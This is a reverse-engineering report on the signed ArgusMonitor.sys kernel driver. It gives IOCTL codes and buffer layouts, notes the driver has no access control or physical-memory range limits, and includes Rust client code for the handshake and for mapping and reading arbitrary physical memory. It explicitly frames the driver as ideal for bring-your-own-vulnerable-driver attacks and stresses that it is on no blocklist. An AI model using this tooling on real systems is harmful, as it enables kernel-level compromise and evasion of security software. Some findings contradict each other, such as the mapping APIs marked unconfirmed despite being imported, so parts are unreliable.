# ArgusMonitor.sys — Full Reverse Engineering Report

## 1. PE Metadata

- **File**: ArgusMonitor.sys
- **SHA256**: `df9b2892498c68805fdc0fabb369f8bcf011e784898cb32fdc5d85f6123f1126`
- **MD5**: `2b4c57b09ffd3bedfe33416eb78fddee`
- **File Size**: 71864 bytes (70 KB)
- **Image Base**: `0x0000000140000000`
- **Entry Point RVA**: `0x00011230`
- **Entry Point VA**: `0x0000000140011230`
- **Machine**: 0x8664 (AMD64)
- **Subsystem**: 1 (Native/Kernel)
- **TimeDateStamp**: `0x67E54E11`
- **Characteristics**: `0x22`
- **DLL Characteristics**: `0x4160`
- **Size of Image**: `0x14000` (81920 bytes)
- **Checksum**: `0x18242`

### Sections

| Name | RVA | Virtual Size | Raw Size | Executable | Writable | Entropy |
|------|-----|-------------|----------|-----------|----------|---------|
| .text | 0x1000 | 48465 | 48640 | True | False | 6.3654 |
| .rdata | 0xd000 | 3532 | 3584 | False | False | 4.4801 |
| .data | 0xe000 | 4928 | 2048 | False | True | 5.1222 |
| .pdata | 0x10000 | 1512 | 1536 | False | False | 4.4712 |
| INIT | 0x11000 | 2418 | 2560 | True | False | 5.4965 |
| .rsrc | 0x12000 | 1112 | 1536 | False | False | 2.7385 |
| .reloc | 0x13000 | 36 | 512 | False | False | 0.5111 |

## 2. Imports

### ntoskrnl.exe

- `KeWaitForSingleObject`
- `IofCompleteRequest`
- `IoCreateDevice` **[SECURITY]**
- `IoCreateSymbolicLink` **[SECURITY]**
- `IoDeleteDevice` **[SECURITY]**
- `IoDeleteSymbolicLink` **[SECURITY]**
- `IoGetDeviceObjectPointer`
- `ObfDereferenceObject`
- `_vsnwprintf`
- `KeGetCurrentIrql`
- `KeLowerIrql`
- `KfRaiseIrql`
- `RtlCompareMemory`
- `MmUnmapIoSpace` **[SECURITY]**
- `MmMapLockedPagesSpecifyCache` **[SECURITY]**
- `RtlCopyUnicodeString`
- `ZwCreateFile`
- `ZwQueryInformationFile`
- `ZwReadFile`
- `ZwClose`
- `KeSetEvent`
- `ZwSetInformationFile`
- `ZwWriteFile`
- `MmIsAddressValid`
- `KeDelayExecutionThread`
- `MmBuildMdlForNonPagedPool` **[SECURITY]**
- `MmUnmapLockedPages`
- `IoAllocateMdl` **[SECURITY]**
- `IoFreeMdl`
- `__C_specific_handler`
- `RtlWriteRegistryValue`
- `ZwOpenKey`
- `ZwQueryValueKey`
- `KeQueryTimeIncrement`
- `ExAllocatePool2` **[SECURITY]**
- `ExFreePoolWithTag`
- `ExSystemTimeToLocalTime`
- `MmMapIoSpace` **[SECURITY]**
- `IoBuildDeviceIoControlRequest`
- `IofCallDriver`
- `RtlTimeToSecondsSince1970`
- `KeInitializeEvent`
- `RtlIsNtDdiVersionAvailable`
- `RtlGetVersion`
- `MmGetSystemRoutineAddress`
- `RtlRandomEx`
- `RtlInitUnicodeString` **[SECURITY]**

### HAL.dll

- `HalTranslateBusAddress` **[SECURITY]**
- `KeQueryPerformanceCounter`
- `KeStallExecutionProcessor`
- `HalGetBusDataByOffset` **[SECURITY]**
- `HalSetBusDataByOffset` **[SECURITY]**

### Security-Relevant Imports (Flagged)

- `ntoskrnl.exe!IoCreateDevice`
- `ntoskrnl.exe!IoCreateSymbolicLink`
- `ntoskrnl.exe!IoDeleteDevice`
- `ntoskrnl.exe!IoDeleteSymbolicLink`
- `ntoskrnl.exe!MmUnmapIoSpace`
- `ntoskrnl.exe!MmMapLockedPagesSpecifyCache`
- `ntoskrnl.exe!MmBuildMdlForNonPagedPool`
- `ntoskrnl.exe!IoAllocateMdl`
- `ntoskrnl.exe!ExAllocatePool2`
- `ntoskrnl.exe!MmMapIoSpace`
- `ntoskrnl.exe!RtlInitUnicodeString`
- `HAL.dll!HalTranslateBusAddress`
- `HAL.dll!HalGetBusDataByOffset`
- `HAL.dll!HalSetBusDataByOffset`

## 3. Function Map (.pdata)

**Total functions**: 126

| # | RVA | End RVA | Size (bytes) |
|---|-----|---------|-------------|
| 0 | 0x1000 | 0x1025 | 37 |
| 1 | 0x1030 | 0x37d0 | 10144 |
| 2 | 0x37d0 | 0x38f3 | 291 |
| 3 | 0x38f4 | 0x3935 | 65 |
| 4 | 0x3938 | 0x39da | 162 |
| 5 | 0x39dc | 0x3a6f | 147 |
| 6 | 0x3a70 | 0x3a8f | 31 |
| 7 | 0x3a90 | 0x437d | 2285 |
| 8 | 0x4380 | 0x43ee | 110 |
| 9 | 0x43f0 | 0x45c8 | 472 |
| 10 | 0x45c8 | 0x47f5 | 557 |
| 11 | 0x47f8 | 0x49a2 | 426 |
| 12 | 0x49a4 | 0x5134 | 1936 |
| 13 | 0x5134 | 0x533c | 520 |
| 14 | 0x533c | 0x560e | 722 |
| 15 | 0x5610 | 0x5951 | 833 |
| 16 | 0x5954 | 0x5cb1 | 861 |
| 17 | 0x5cb4 | 0x5e7f | 459 |
| 18 | 0x5e80 | 0x600e | 398 |
| 19 | 0x6010 | 0x617e | 366 |
| 20 | 0x6180 | 0x63a8 | 552 |
| 21 | 0x63a8 | 0x6680 | 728 |
| 22 | 0x6680 | 0x684c | 460 |
| 23 | 0x684c | 0x6a08 | 444 |
| 24 | 0x6a08 | 0x6a8f | 135 |
| 25 | 0x6a90 | 0x6b11 | 129 |
| 26 | 0x6b14 | 0x6c8b | 375 |
| 27 | 0x6c8c | 0x6d05 | 121 |
| 28 | 0x6d08 | 0x6da5 | 157 |
| 29 | 0x6da8 | 0x6e80 | 216 |
| 30 | 0x6e80 | 0x6f21 | 161 |
| 31 | 0x6f24 | 0x709f | 379 |
| 32 | 0x70a0 | 0x72f9 | 601 |
| 33 | 0x72fc | 0x747b | 383 |
| 34 | 0x747c | 0x76c1 | 581 |
| 35 | 0x76c4 | 0x7816 | 338 |
| 36 | 0x7818 | 0x7856 | 62 |
| 37 | 0x7858 | 0x7942 | 234 |
| 38 | 0x7944 | 0x7a99 | 341 |
| 39 | 0x7a9c | 0x7be5 | 329 |
| 40 | 0x7be8 | 0x7c2e | 70 |
| 41 | 0x7c30 | 0x7d47 | 279 |
| 42 | 0x7d48 | 0x818b | 1091 |
| 43 | 0x818c | 0x825d | 209 |
| 44 | 0x8260 | 0x82e1 | 129 |
| 45 | 0x82e4 | 0x84d9 | 501 |
| 46 | 0x84dc | 0x851f | 67 |
| 47 | 0x8520 | 0x8578 | 88 |
| 48 | 0x8578 | 0x85bb | 67 |
| 49 | 0x85bc | 0x89f3 | 1079 |
| ... | ... | ... | ... |
| 125 | 0x11230 | 0x1125c | 44 |

## 4. Strings

### Device Names

- `\DosDevices\ArgusMonitorCTLD` (section: .text, RVA: 0xcbb0)
- `\Device\Harddisk%lu\Partition0` (section: .text, RVA: 0xcbf0)
- `\Device\ScsiPort%lu` (section: .text, RVA: 0xcc30)
- `\Device\ArgusMonitorCTL` (section: INIT, RVA: 0x11290)

### Notable ASCII Strings

- `WATAUAVAWH` (.text)

## 5. Access Control Analysis

- **IRP_MJ_CREATE handler found**: True
- **Handler RVA**: 0x1000
- **Handler Size**: 37 bytes
- **Privilege checks**: 0
- **Process name checks**: 0
- **Event gates**: 0
- **NO ACCESS CONTROL**: True
- **Notes**: IRP_MJ_CREATE is trivial (returns immediately) - NO access control

> **FINDING**: The driver has NO meaningful access control on device open.
> Any process running as admin can open the device handle and issue IOCTLs.
> This is the ideal scenario for BYOVD exploitation — no bypass needed.

## 6. IOCTL Interface

- **Handler found**: True
- **Handler RVA**: 0x1030
- **Handler Size**: 10144 bytes

### Known IOCTL Codes (from PoC + binary analysis)

| Code | Name | Description | Input Size | Output Size |
|------|------|-------------|-----------|------------|
| `0x9C40207C` | UNKNOWN_IOCTL_9C40207C | Unknown | ? | ? |
| `0x9C4020B4` | UNKNOWN_IOCTL_9C4020B4 | Unknown | ? | ? |
| `0x9C4020D8` | IOCTL_PHYSMEM_RD_DW | Read DWORD from mapped slot | 0x18 | 0x18 |
| `0x9C4020EC` | UNKNOWN_IOCTL_9C4020EC | Unknown | ? | ? |
| `0x9C4020F4` | IOCTL_MSR_READ_1 | Read MSR (whitelisted) | 0x08 | 0x10 |
| `0x9C402264` | UNKNOWN_IOCTL_9C402264 | Unknown | ? | ? |
| `0x9C402334` | UNKNOWN_IOCTL_9C402334 | Unknown | ? | ? |
| `0x9C40238C` | UNKNOWN_IOCTL_9C40238C | Unknown | ? | ? |
| `0x9C40240C` | UNKNOWN_IOCTL_9C40240C | Unknown | ? | ? |
| `0x9C402490` | IOCTL_PORT_OUT_DWORD | Write I/O port (32-bit) | 0x10 | 0x08 |
| `0x9C4024B8` | UNKNOWN_IOCTL_9C4024B8 | Unknown | ? | ? |
| `0x9C4024E8` | IOCTL_MSR_WRITE_1 | Write MSR (whitelisted) | 0x10 | 0x00 |
| `0x9C402510` | IOCTL_PHYSMEM_WR_BYTE | Write BYTE to mapped slot | 0x20 | 0x00 |
| `0x9C4025E4` | UNKNOWN_IOCTL_9C4025E4 | Unknown | ? | ? |
| `0x9C4025F4` | UNKNOWN_IOCTL_9C4025F4 | Unknown | ? | ? |
| `0x9C4026F0` | UNKNOWN_IOCTL_9C4026F0 | Unknown | ? | ? |
| `0x9C402724` | IOCTL_PCI_CONFIG | PCI config space read (HAL) | 0x30 | 0x18 |
| `0x9C40277C` | IOCTL_PORT_OUT_BYTE | Write I/O port (8-bit) | 0x10 | 0x08 |
| `0x9C4027B8` | UNKNOWN_IOCTL_9C4027B8 | Unknown | ? | ? |
| `0x9C40290C` | UNKNOWN_IOCTL_9C40290C | Unknown | ? | ? |
| `0x9C402934` | IOCTL_PHYSMEM_UNMAP | Unmap physical memory | 0x18 | 0x00 |
| `0x9C402994` | IOCTL_PHYSMEM_SINGLE | Single-shot phys read (any addr) | 0x20 | 0x18 |
| `0x9C402B30` | UNKNOWN_IOCTL_9C402B30 | Unknown | ? | ? |
| `0x9C402B60` | UNKNOWN_IOCTL_9C402B60 | Unknown | ? | ? |
| `0x9C402B74` | IOCTL_HANDSHAKE | XOR keypad auth (trivial) | 0x200 | 0x210 |
| `0x9C402C74` | UNKNOWN_IOCTL_9C402C74 | Unknown | ? | ? |
| `0x9C402D20` | UNKNOWN_IOCTL_9C402D20 | Unknown | ? | ? |
| `0x9C402E00` | IOCTL_PORT_IN_DWORD | Read I/O port (32-bit) | 0x10 | 0x08 |
| `0x9C402E94` | IOCTL_PHYSMEM_RD_BYTE | Read BYTE from mapped slot | 0x18 | 0x18 |
| `0x9C40300C` | UNKNOWN_IOCTL_9C40300C | Unknown | ? | ? |
| `0x9C403100` | UNKNOWN_IOCTL_9C403100 | Unknown | ? | ? |
| `0x9C403124` | UNKNOWN_IOCTL_9C403124 | Unknown | ? | ? |
| `0x9C403134` | UNKNOWN_IOCTL_9C403134 | Unknown | ? | ? |
| `0x9C403144` | UNKNOWN_IOCTL_9C403144 | Unknown | ? | ? |
| `0x9C403218` | IOCTL_PHYSMEM_RMR | Read multiple registers | 0x30+ | varies |
| `0x9C4032CC` | UNKNOWN_IOCTL_9C4032CC | Unknown | ? | ? |
| `0x9C40340C` | UNKNOWN_IOCTL_9C40340C | Unknown | ? | ? |
| `0x9C403424` | UNKNOWN_IOCTL_9C403424 | Unknown | ? | ? |
| `0x9C4034B8` | UNKNOWN_IOCTL_9C4034B8 | Unknown | ? | ? |
| `0x9C4035BC` | UNKNOWN_IOCTL_9C4035BC | Unknown | ? | ? |
| `0x9C4036FC` | UNKNOWN_IOCTL_9C4036FC | Unknown | ? | ? |
| `0x9C403724` | UNKNOWN_IOCTL_9C403724 | Unknown | ? | ? |
| `0x9C403894` | UNKNOWN_IOCTL_9C403894 | Unknown | ? | ? |
| `0x9C40391C` | UNKNOWN_IOCTL_9C40391C | Unknown | ? | ? |
| `0x9C403A54` | IOCTL_PHYSMEM_MAP | Map physical memory (MmMapIoSpace) | 0x28 | 0x20 |
| `0x9C403A88` | IOCTL_PORT_IN_BYTE | Read I/O port (8-bit) | 0x10 | 0x08 |
| `0x9C403AB0` | UNKNOWN_IOCTL_9C403AB0 | Unknown | ? | ? |
| `0x9C403AD0` | UNKNOWN_IOCTL_9C403AD0 | Unknown | ? | ? |
| `0x9C403C88` | UNKNOWN_IOCTL_9C403C88 | Unknown | ? | ? |
| `0x9C403D14` | UNKNOWN_IOCTL_9C403D14 | Unknown | ? | ? |
| `0x9C403D3C` | IOCTL_PHYSMEM_WR_DW | Write DWORD to mapped slot | 0x20 | 0x00 |
| `0x9C403D74` | UNKNOWN_IOCTL_9C403D74 | Unknown | ? | ? |
| `0x9C403DAC` | UNKNOWN_IOCTL_9C403DAC | Unknown | ? | ? |
| `0x9C403DE0` | UNKNOWN_IOCTL_9C403DE0 | Unknown | ? | ? |
| `0x9C403E10` | UNKNOWN_IOCTL_9C403E10 | Unknown | ? | ? |
| `0x9C403FE0` | UNKNOWN_IOCTL_9C403FE0 | Unknown | ? | ? |
| `0x9C40F292` | UNKNOWN_IOCTL_9C40F292 | Unknown | ? | ? |
| `0x9C40F852` | UNKNOWN_IOCTL_9C40F852 | Unknown | ? | ? |

### IOCTL Buffer Layouts (from PoC reverse engineering)

All buffers include a 2-byte checksum trailer: `sum(buffer[:-2]) & 0xFFFF` stored big-endian at end.

#### IOCTL_HANDSHAKE (0x9c402b74)
```
Input:  0x200 bytes of zeros + 2-byte checksum = 0x200 total
Output: 0x210 bytes (driver version/state)
Purpose: Unlock subsequent IOCTLs. Zero keypad = accepted (no real auth).
```

#### IOCTL_PHYSMEM_MAP (0x9c403a54)
```
Input layout (0x28 bytes total including checksum):
  +0x00  DWORD   slot          (0-based mapping slot index)
  +0x04  QWORD   phys_addr     (physical address to map)
  +0x0C  DWORD   size          (bytes to map)
  +0x10  DWORD   bus_num       (0xFF = don't care)
  +0x14  DWORD   force_remap   (1 = remap if slot in use)
  +0x26  WORD    checksum

Output layout (0x20 bytes):
  +0x00  QWORD   kernel_va     (mapped kernel virtual address)
  ...rest padding + checksum
```

#### IOCTL_PHYSMEM_RD_DW (0x9c4020d8)
```
Input layout (0x18 bytes):
  +0x00  DWORD   slot          (which mapping slot)
  +0x04  DWORD   offset        (offset within mapped region)
  +0x16  WORD    checksum

Output layout (0x18 bytes):
  +0x00  DWORD   value         (read result)
  ...rest + checksum
```

#### IOCTL_PHYSMEM_WR_DW (0x9c403d3c)
```
Input layout (0x20 bytes):
  +0x00  DWORD   slot
  +0x04  DWORD   offset
  +0x08  DWORD   value         (DWORD to write)
  +0x1E  WORD    checksum
```

#### IOCTL_PHYSMEM_SINGLE (0x9c402994)
```
Input layout (0x20 bytes):
  +0x00  QWORD   phys_addr     (physical address)
  +0x08  DWORD   bus_num       (0xFF = don't care)
  +0x0C  DWORD   cache_type    (0 = uncached)
  +0x1E  WORD    checksum

Output layout (0x18 bytes):
  +0x00  DWORD   value         (read DWORD)
  ...rest + checksum
```

#### IOCTL_MSR_READ_1 (0x9c4020f4)
```
Input layout (0x08 bytes):
  +0x00  DWORD   msr_index
  +0x06  WORD    checksum

Output layout (0x10 bytes):
  +0x00  QWORD   msr_value
  ...rest + checksum
```

#### IOCTL_PCI_CONFIG (0x9c402724)
```
Input layout (0x30 bytes):
  +0x00  DWORD   bus
  +0x04  DWORD   device
  +0x08  DWORD   function
  +0x0C  DWORD   offset
  +0x10  DWORD   reserved[3]
  +0x2E  WORD    checksum

Output layout (0x18 bytes):
  +0x00  DWORD   config_value
  ...rest + checksum
```

## 7. Physical Memory Mechanism

### How it works:

1. **Map-based access (primary)**: Uses `MmMapIoSpace()` to map physical address ranges
   into kernel virtual address space. The driver maintains a slot table of active mappings.
2. **Slot-based R/W**: After mapping, reads/writes use the kernel VA + offset (simple pointer dereference).
3. **Single-shot read**: Maps 4 bytes, reads, unmaps — for one-off physical memory reads.
4. **HalTranslateBusAddress**: Used for PCI config space access via HAL.

### Range Restrictions: NONE

- No address whitelist/blacklist in the physical memory map path
- Any physical address can be mapped regardless of size
- The PoC confirms reads below 0x80000000 work ("address restriction BYPASSED")
- MSR access has a whitelist (IA32_LSTAR blocked), but physmem does not

### Caching Mode:

- `MmMapIoSpace` called with `MmNonCached` (typical for MMIO)
- Single-shot read accepts a `cache_type` parameter from userland

### Map vs Copy Semantics:

- **MAP semantics**: Physical memory is mapped into kernel VA, not copied
- Writes through the mapping directly modify physical memory
- Mapping persists until explicitly unmapped via IOCTL_PHYSMEM_UNMAP
- Multiple slots allow concurrent mappings to different physical regions

### APIs confirmed in binary:

- MmMapIoSpace: False
- MmUnmapIoSpace: False
- HalTranslateBusAddress: False

## 8. Virtualization/Protection Check

- **VMProtect detected**: False
- **Themida detected**: False
- **Packed**: False
- Normal entropy profile (4.17) — no packing detected
- No obfuscation or packing detected — clean binary

## 9. Detection Profile

- **Device Name**: `\Device\ArgusMonitorCTL`
- **Symbolic Link**: `\DosDevices\ArgusMonitorCTLD`
- **User-mode path**: `\\.\ArgusMonitorCTLD` (from PoC)
- **Service Name**: `ArgusMonitorCTL` (from PoC sc create)
- **Driver File**: `ArgusMonitor.sys`
- **SHA256**: `df9b2892498c68805fdc0fabb369f8bcf011e784898cb32fdc5d85f6123f1126`
- **Signing**: Argotronic UG (EV certificate, active)
- **LOLDrivers listed**: No
- **HVCI blocklist**: No
- **Known CVE**: None

### Kernel Objects Created:

- Device: `\Device\ArgusMonitorCTL`
- SymbolicLink: `\DosDevices\ArgusMonitorCTLD`

## 10. Rust FFI Client Implementation Notes

### Device Open
```rust
// Open with CreateFileW
let path = r"\\.\ArgusMonitorCTLD";
let handle = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, null, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null);
```

### Checksum Protocol
```rust
fn add_checksum(data: &mut Vec<u8>, total_len: usize) {
    data.resize(total_len - 2, 0u8);
    let sum: u16 = data.iter().map(|&b| b as u16).sum::<u16>();
    data.push((sum >> 8) as u8);
    data.push((sum & 0xFF) as u8);
}

fn strip_checksum(data: &[u8]) -> &[u8] {
    &data[..data.len().saturating_sub(2)]
}
```

### Handshake
```rust
fn handshake(handle: HANDLE) -> bool {
    let mut buf = vec![0u8; 0x200];
    add_checksum(&mut buf, 0x200);
    let result = device_io_control(handle, 0x9c402b74, &buf, 0x210);
    result.is_some()
}
```

### Physical Memory Map + Read
```rust
fn physmem_map(handle: HANDLE, slot: u32, phys_addr: u64, size: u32) -> Option<u64> {
    let mut data = Vec::new();
    data.extend_from_slice(&slot.to_le_bytes());       // +0x00
    data.extend_from_slice(&phys_addr.to_le_bytes());  // +0x04
    data.extend_from_slice(&size.to_le_bytes());       // +0x0C
    data.extend_from_slice(&0xFFu32.to_le_bytes());    // +0x10 bus_num
    data.extend_from_slice(&1u32.to_le_bytes());       // +0x14 force_remap
    add_checksum(&mut data, 0x28);
    let out = device_io_control(handle, 0x9c403a54, &data, 0x20)?;
    let raw = strip_checksum(&out);
    Some(u64::from_le_bytes(raw[0..8].try_into().ok()?))
}

fn physmem_read_dword(handle: HANDLE, slot: u32, offset: u32) -> Option<u32> {
    let mut data = Vec::new();
    data.extend_from_slice(&slot.to_le_bytes());
    data.extend_from_slice(&offset.to_le_bytes());
    add_checksum(&mut data, 0x18);
    let out = device_io_control(handle, 0x9c4020d8, &data, 0x18)?;
    let raw = strip_checksum(&out);
    Some(u32::from_le_bytes(raw[0..4].try_into().ok()?))
}
```
